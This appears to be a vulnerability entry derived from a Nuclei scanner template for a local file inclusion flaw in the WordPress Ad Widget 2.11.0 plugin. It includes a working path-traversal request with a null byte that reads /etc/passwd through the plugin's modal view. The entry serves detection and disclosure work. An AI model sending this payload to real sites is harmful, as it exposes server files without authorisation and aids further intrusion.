# Vulnerability: WordPress Ad Widget 2.11.0 - Local File Inclusion
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`ad-widget-lfi.yaml`)

## Description
WordPress Ad Widget 2.11.0 is vulnerable to local file inclusion. Exploiting this issue may allow an attacker to obtain sensitive information that could aid in further attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/ad-widget/views/modal/?step=../../../../../../../etc/passwd%00
```

